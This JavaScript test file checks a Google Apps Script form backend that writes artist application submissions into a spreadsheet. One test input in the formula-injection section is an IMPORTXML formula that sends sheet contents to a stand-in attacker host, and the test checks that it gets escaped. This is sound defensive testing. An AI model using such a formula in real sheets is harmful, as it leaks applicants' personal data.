import fs from "node:fs"
import { run } from "./harness.mjs"

const PAYLOAD = {
  profile: {
    fullName: "Ana Ribeiro",
    email: "ana@exemplo.com",
    phone: "+55 11 99999-0000",
    location: "São Paulo / Brasil",
    portfolio: "https://behance.net/ana",
    website: "https://ana.studio",
    behance: "https://behance.net/ana",
    vimeo: "https://vimeo.com/ana",
    instagram: "https://instagram.com/ana",
    linkedin: "https://linkedin.com/in/ana",
    otherLink: ""
  },
  // v7: every question is a list. A bare string here would be a regression.
  expertise: ["art-director", "animator"],
  aiWorkflow: ["combine", "node-based"],
  strength: ["languages-worlds"],
  aiLedLink: "https://vimeo.com/ai-led",
  aiExecutedLink: "https://vimeo.com/ai-exec",
  projectTypes: ["short-film", "commercial"],
  projectLinks: {
    "short-film": "https://vimeo.com/curta",
    commercial: "https://vimeo.com/ad"
  },
  pipeline: ["direction", "3d-animation", "vfx"],
  tools: [
    // Runway ticked in three areas — one tool, three facts.
    { id: "runway", name: "Runway", group: "concept" },
    { id: "runway", name: "Runway", group: "vfx" },
    { id: "runway", name: "Runway", group: "video" },
    { id: "midjourney", name: "Midjourney", group: "concept" },
    { id: "cascadeur", name: "Cascadeur", group: "modeling" }
  ],
  otherTools: "Krea",
  meta: {
    submittedAt: "2026-08-24T14:00:00.000Z",
    language: "pt-BR",
    timezone: "America/Sao_Paulo",
    userAgent: "Mozilla/5.0 test",
    formVersion: "7"
  },
  guard: { hp: "", elapsedMs: 20000, turnstileToken: "" }
}

const post = (sandbox, payload) =>
  sandbox.doPost({ postData: { contents: JSON.stringify(payload) } })

const results = []
const check = (name, cond, detail = "") =>
  results.push({ name, pass: !!cond, detail: cond ? "" : detail })

const asObject = (headers, row) => Object.fromEntries(headers.map((h, i) => [h, row[i]]))

/* ── 1. setupSheet builds the whole schema ──────────────────────────────── */
{
  const { sandbox, sheet } = run([])
  const msg = sandbox.setupSheet()
  const headers = sheet._grid[0]

  check("1a all columns created", headers.length === sandbox.COLUMNS.length,
    `got ${headers.length} of ${sandbox.COLUMNS.length}`)
  check("1b header order matches schema",
    JSON.stringify(headers) === JSON.stringify(sandbox.HEADERS))
  check("1c headers are unique", new Set(headers).size === headers.length,
    "a prefix collision would silently overwrite a column")
  check("1d one column per distinct tool (74, not the 90 checkboxes)",
    sandbox.TOOL_ROSTER.length === 74 &&
      sandbox.TOOL_ROSTER.every((t) => headers.includes(`Tool: ${t.label}`)),
    `roster=${sandbox.TOOL_ROSTER.length}`)
  check("1e one column per pipeline area",
    sandbox.PIPELINE_ROSTER.every((c) => headers.includes(`Pipeline: ${c.label}`)))
  check("1f the three practice questions each get a readable column",
    ["Primary Practice","AI Workflow","Core Strength"].every((h) => headers.includes(h)))
  check("1f2 the retired questions are gone from the schema",
    !headers.includes("Responsibility") && !headers.includes("Work Mode") &&
      !headers.includes("Visual Challenge") && !headers.includes("Finishing") &&
      !headers.includes("Project Reach") && !headers.includes("AI Integration"),
    "a question removed from the form must not keep writing a column")
  check("1f3 each contact link gets its own column, not one packed cell",
    ["Site","Behance","Vimeo","Instagram","LinkedIn","Other Link"]
      .every((h) => headers.includes(h)) && !headers.includes("Additional Links"))
  check("1f4 every multi-select question also gets a per-option filter column",
    sandbox.EXPERTISE_ROSTER.every((c) => headers.includes(`Practice: ${c.label}`)) &&
      sandbox.AI_WORKFLOW_ROSTER.every((c) => headers.includes(`Workflow: ${c.label}`)) &&
      sandbox.STRENGTH_ROSTER.every((c) => headers.includes(`Strength: ${c.label}`)),
    "a joined list is unfilterable — the Yes/blank block is what replaces it")
  check("1f5 the dropped questions take their filter columns with them",
    !headers.some((h) => h.startsWith("Reach: ") || h.startsWith("AI: ")))
  check("1g project types get both a flag and a credits link",
    sandbox.PROJECT_TYPE_ROSTER.every(
      (c) => headers.includes(`Led: ${c.label}`) && headers.includes(`Link: ${c.label}`)
    ))
  check("1h every column got a width",
    Object.keys(sheet._calls.widths).length === sandbox.COLUMNS.length)
  check("1i header row frozen", sheet._calls.frozen.rows === 1)
  check("1j frozen through Full Name, so the wide block stays readable",
    sheet._calls.frozen.cols === 2, `cols=${sheet._calls.frozen.cols}`)
  check("1k Rating is a numeric dropdown",
    !!sheet._calls.validations[headers.indexOf("Rating") + 1]?.list &&
      sheet._calls.formats[headers.indexOf("Rating") + 1] === "0")
  check("1l sheet widened past the default 26 columns", sheet._calls.insertedColumns > 0)
  check("1m banding starts at row 2, header excluded",
    sheet._calls.banding?.startRow === 2 && sheet._calls.banding?.showHeader === false)
  check("1n setup reports ok", /ready with \d+ columns/.test(msg), msg)
}

/* ── 2. A submission lands under the right headers ──────────────────────── */
{
  const { sandbox, sheet } = run([])
  sandbox.setupSheet()
  post(sandbox, PAYLOAD)

  const headers = sheet._grid[0]
  const row = asObject(headers, sheet._grid[1])

  check("2a row appended", sheet._grid.length === 2)
  check("2b name", row["Full Name"] === "Ana Ribeiro")
  check("2c accents survive", row["Location"] === "São Paulo / Brasil", String(row["Location"]))
  check("2d practice keeps BOTH answers, in roster order",
    row["Primary Practice"] === "Art Director, Animator", String(row["Primary Practice"]))
  check("2e each contact link lands in its own column",
    row["Site"] === "https://ana.studio" && row["LinkedIn"] === "https://linkedin.com/in/ana",
    `${row["Site"]} / ${row["LinkedIn"]}`)
  check("2e2 a link left blank stays blank", row["Other Link"] === "",
    JSON.stringify(row["Other Link"]))
  check("2g2 the two AI project links land in their own columns",
    row["AI Project (led)"] === "https://vimeo.com/ai-led" &&
      row["AI Project (executed)"] === "https://vimeo.com/ai-exec")
  check("2h AI workflow multi-select",
    row["AI Workflow"] ===
      "I combine different AI tools in the same workflow, I use node-based / modular workflows",
    String(row["AI Workflow"]))
  check("2h2 core strength resolves",
    row["Core Strength"] === "Creating visual languages and worlds", String(row["Core Strength"]))
  check("2i led projects", row["Led Projects"] === "Short Film, Commercial / Advertising",
    String(row["Led Projects"]))
  check("2j pipeline areas in roster order, not click order",
    row["Pipeline Areas"] === "Direction, 3D animation, VFX",
    String(row["Pipeline Areas"]))
  check("2k tools counted DISTINCTLY — Runway ticked 3x is one tool",
    row["Tools Count"] === 3, String(row["Tools Count"]))
  check("2l all tools deduplicated", row["All Tools"] === "Runway, Midjourney, Cascadeur",
    String(row["All Tools"]))
  check("2m other tools", row["Other Tools"] === "Krea")
  check("2n status seeded", row["Status"] === "Novo")
  check("2o rating left for the team", row["Rating"] === "")
  check("2q received at is a real timestamp",
    Object.prototype.toString.call(row["Received At"]) === "[object Date]" &&
      Math.abs(row["Received At"].getTime() - Date.now()) < 60_000)
  check("2r no value bled past the last column", sheet._grid[1].length === headers.length)
}

/* ── 3. The filtering block: one click, one column ──────────────────────── */
{
  const { sandbox, sheet } = run([])
  sandbox.setupSheet()
  post(sandbox, PAYLOAD)
  const row = asObject(sheet._grid[0], sheet._grid[1])

  // Binho's example, literally: find everyone who works with Stable Diffusion.
  check("3a a tool NOT selected is blank, not absent",
    row["Tool: Stable Diffusion"] === "", JSON.stringify(row["Tool: Stable Diffusion"]))
  check("3b a tool column lists the AREAS it was ticked in, so one filter says who + for what",
    row["Tool: Runway"] ===
      "Concept art / visual development / storyboard / previs / animatic, " +
      "Video generation, VFX / compositing / cleanup",
    String(row["Tool: Runway"]))
  check("3c a tool ticked in one area lists just that area",
    row["Tool: Cascadeur"] === "3D / modeling / assets / character / rigging / animation",
    String(row["Tool: Cascadeur"]))
  check("3d pipeline area flag", row["Pipeline: Direction"] === "Yes")
  check("3e unticked pipeline area is blank", row["Pipeline: Production"] === "")
  check("3f second pipeline flag", row["Pipeline: VFX"] === "Yes")
  check("3g 'led a short film' is one filter click", row["Led: Short Film"] === "Yes")
  check("3h and its credits link sits right beside it",
    row["Link: Short Film"] === "https://vimeo.com/curta", String(row["Link: Short Film"]))
  check("3i a project type not led has no link", row["Link: Feature Film"] === "")
  check("3j workflow flag", row["Workflow: I use node-based / modular workflows"] === "Yes")
  check("3k BOTH practice answers are filterable independently — the whole point of the block",
    row["Practice: Art Director"] === "Yes" && row["Practice: Animator"] === "Yes" &&
      row["Practice: Designer"] === "",
    `${row["Practice: Art Director"]} / ${row["Practice: Animator"]} / ${row["Practice: Designer"]}`)
  check("3n strength flag", row["Strength: Creating visual languages and worlds"] === "Yes")
}

/* ── 4. Edge cases that must not crash or invent data ───────────────────── */
{
  const { sandbox, sheet } = run([])
  sandbox.setupSheet()

  // Someone who ticks nothing but the required fields and one tool.
  post(sandbox, {
    ...PAYLOAD,
    expertise: [],
    aiWorkflow: [],
    strength: [],
    aiLedLink: "",
    aiExecutedLink: "",
    projectTypes: [],
    projectLinks: {},
    pipeline: [],
    tools: [{ id: "midjourney", name: "Midjourney", group: "concept" }],
    otherTools: ""
  })
  const bare = asObject(sheet._grid[0], sheet._grid[1])
  check("4a empty questions are blank, not 'undefined'",
    bare["Primary Practice"] === "" && bare["AI Workflow"] === "" &&
      bare["Core Strength"] === "",
    `${bare["Primary Practice"]} / ${bare["Core Strength"]}`)
  check("4b empty multi-selects are blank",
    bare["AI Workflow"] === "" && bare["Pipeline Areas"] === "")
  check("4c tools count is a number, not blank", bare["Tools Count"] === 1)
  check("4d the one tool still lands",
    bare["Tool: Midjourney"] ===
      "Concept art / visual development / storyboard / previs / animatic",
    String(bare["Tool: Midjourney"]))

  // An id the roster does not know must not blow up the row.
  post(sandbox, {
    ...PAYLOAD,
    expertise: ["gaffer"],
    tools: [{ id: "nope", name: "Nope", group: "zzz" }]
  })
  const odd = asObject(sheet._grid[0], sheet._grid[2])
  check("4e unknown answer id resolves to blank", odd["Primary Practice"] === "")
  check("4f unknown tool does not appear anywhere", odd["All Tools"] === "Nope" && odd["Tools Count"] === 1)

  // An older client still in someone's cached bundle posts strings, not arrays.
  post(sandbox, { ...PAYLOAD, expertise: "art-director", pipeline: "direction" })
  const legacyShape = asObject(sheet._grid[0], sheet._grid[3])
  check("4g an older payload's bare string cannot corrupt the row",
    legacyShape["Full Name"] === "Ana Ribeiro" &&
      typeof legacyShape["Primary Practice"] === "string",
    String(legacyShape["Primary Practice"]))
}

/* ── 4b. Formula injection and phone numbers ────────────────────────────── */
{
  const { sandbox, sheet } = run([])
  sandbox.setupSheet()

  post(sandbox, {
    ...PAYLOAD,
    profile: {
      ...PAYLOAD.profile,
      // The real-world case: an international number starts with "+", which
      // Sheets parses as a formula and renders as #ERROR!, losing the number.
      phone: "+55 11 90000-0000",
      // The dangerous case: a formula that would run when a teammate opens the
      // sheet and post other rows to an attacker.
      fullName: '=IMPORTXML("https://attacker.example/?"&A2,"//a")',
      website: "-nothing yet",
      location: "@home"
    }
  })
  const row = asObject(sheet._grid[0], sheet._grid[1])

  check("4b1 a +country-code phone is stored as text, not #ERROR!",
    row["Phone / WhatsApp"] === "'+55 11 90000-0000", JSON.stringify(row["Phone / WhatsApp"]))
  check("4b2 a formula in a text field is neutralised",
    row["Full Name"].startsWith("'="), JSON.stringify(row["Full Name"]).slice(0, 60))
  check("4b3 leading - is escaped", row["Site"] === "'-nothing yet", JSON.stringify(row["Site"]))
  check("4b4 leading @ is escaped", row["Location"] === "'@home")
  check("4b5 ordinary text is left alone", row["Email"] === "ana@exemplo.com",
    JSON.stringify(row["Email"]))
  check("4b6 numbers are not turned into strings",
    row["Tools Count"] === 3 && typeof row["Tools Count"] === "number",
    String(row["Tools Count"]))
  check("4b7 the timestamp is still a Date",
    Object.prototype.toString.call(row["Received At"]) === "[object Date]")
  // Text columns keep the default format on purpose: a plain-text ("@") cell
  // skips Sheets' input parsing, which is what strips the escaping apostrophe.
  check("4b8 text columns keep the default format, so the apostrophe stays invisible",
    sheet._calls.formats[sheet._grid[0].indexOf("Full Name") + 1] === undefined,
    String(sheet._calls.formats[sheet._grid[0].indexOf("Full Name") + 1]))
}

/* ── 5. Columns reordered by hand in Sheets ─────────────────────────────── */
{
  const { sandbox: probe } = run([])
  const shuffled = [...probe.HEADERS].reverse() // worst case: fully inverted
  const { sandbox, sheet } = run([shuffled])
  post(sandbox, PAYLOAD)

  const row = asObject(sheet._grid[0], sheet._grid[1])
  check("5a reordered: name still correct", row["Full Name"] === "Ana Ribeiro")
  check("5b reordered: per-tool column still correct",
    row["Tool: Cascadeur"] === "3D / modeling / assets / character / rigging / animation")
  check("5c reordered: header row untouched",
    JSON.stringify(sheet._grid[0]) === JSON.stringify(shuffled))
}

/* ── 6. A v2 sheet upgrading to v6 ──────────────────────────────────────── */
{
  const legacy = [
    "Received At", "Full Name", "Status", "Rating", "Email", "Phone / WhatsApp", "Location",
    "Roles", "Roles Count", "Published In", "Published Link", "Portfolio / Demo Reel",
    "Additional Links", "Pipeline", "Tools Count", "AI Tools Count", "Advanced",
    "Intermediate", "Basic", "All Tools (with level)", "Other Tools", "Language",
    "Timezone", "Submitted At (client)", "Form Version", "User Agent", "Notes"
  ]
  const oldRow = legacy.map((h, i) => `old-${i}`)
  const { sandbox, sheet } = run([legacy, oldRow])

  post(sandbox, PAYLOAD)
  const headers = sheet._grid[0]

  check("6a v6 columns appended",
    headers.includes("Primary Practice") && headers.includes("Led: Short Film") &&
      headers.includes("Pipeline: Direction") && headers.includes("Practice: Art Director"))
  check("6b v2 columns kept their position",
    JSON.stringify(headers.slice(0, legacy.length)) === JSON.stringify(legacy))
  check("6c retired columns are preserved, not deleted",
    headers.includes("Roles") && headers.includes("Advanced") &&
      headers.includes("Additional Links"),
    "removing a column would destroy older data")
  check("6d existing data row untouched", JSON.stringify(sheet._grid[1]) === JSON.stringify(oldRow))
  check("6e new row lands correctly", asObject(headers, sheet._grid[2])["Full Name"] === "Ana Ribeiro")
  check("6f retired column gets blank, never garbage",
    asObject(headers, sheet._grid[2])["Advanced"] === "" &&
      asObject(headers, sheet._grid[2])["Additional Links"] === "")
  check("6g shared columns keep working across versions",
    asObject(headers, sheet._grid[2])["Tools Count"] === 3)
  check("6h dropped questions never come back as empty columns",
    !headers.includes("AI Experience") && !headers.includes("Practice Areas") &&
      !headers.includes("AI Relationship") && !headers.includes("Responsibility") &&
      !headers.includes("Project Reach"),
    "a removed question must not be re-created")
}

/* ── 7. Guards ──────────────────────────────────────────────────────────── */
{
  const { sandbox, sheet } = run([])
  sandbox.setupSheet()

  post(sandbox, { ...PAYLOAD, guard: { hp: "bot", elapsedMs: 20000 } })
  check("7a honeypot writes nothing", sheet._grid.length === 1)

  post(sandbox, { ...PAYLOAD, guard: { hp: "", elapsedMs: 500 } })
  check("7b too-fast writes nothing", sheet._grid.length === 1)

  post(sandbox, { ...PAYLOAD, profile: { ...PAYLOAD.profile, email: "" } })
  check("7c missing email rejected", sheet._grid.length === 1)

  const res = post(sandbox, PAYLOAD)
  check("7d valid submission accepted", sheet._grid.length === 2)
  check("7e responds ok:true", res._text === '{"ok":true}', res._text)
}

/* ── 7b. The health check identifies the deployment ─────────────────────── */
{
  const { sandbox, sheet } = run([])
  const body = JSON.parse(sandbox.doGet()._text)

  check("7b1 doGet reports the schema version, so two /exec URLs are tellable apart",
    body.ok === true && body.schema === sandbox.SCHEMA_VERSION && body.columns > 0,
    JSON.stringify(body))

  // The version is declared in two files that cannot import each other, so the
  // only thing stopping them drifting is this assertion.
  const submitSrc = fs.readFileSync(new URL("../../src/lib/submit.ts", import.meta.url), "utf8")
  const formVersion = submitSrc.match(/FORM_VERSION\s*=\s*"([^"]+)"/)?.[1]
  check("7b2 SCHEMA_VERSION matches FORM_VERSION in src/lib/submit.ts",
    formVersion === sandbox.SCHEMA_VERSION,
    `Code.gs=${sandbox.SCHEMA_VERSION} submit.ts=${formVersion}`)

  check("7b3 the health check never touches the sheet", sheet._grid.length === 0,
    "this endpoint is public — it must not become a way to read applications")
}

/* ── 8. setupSheet is idempotent ────────────────────────────────────────── */
{
  const { sandbox, sheet } = run([])
  sandbox.setupSheet()
  post(sandbox, PAYLOAD)
  const after1 = JSON.stringify(sheet._grid)
  sandbox.setupSheet()
  sandbox.setupSheet()
  check("8a re-running setup changes no data", JSON.stringify(sheet._grid) === after1)
}

const failed = results.filter((r) => !r.pass)
results.forEach((r) =>
  console.log(`${r.pass ? "PASS" : "FAIL"}  ${r.name}${r.detail ? "  -> " + r.detail : ""}`)
)
console.log(`\n${results.length - failed.length}/${results.length} passed`)
process.exit(failed.length ? 1 : 0)
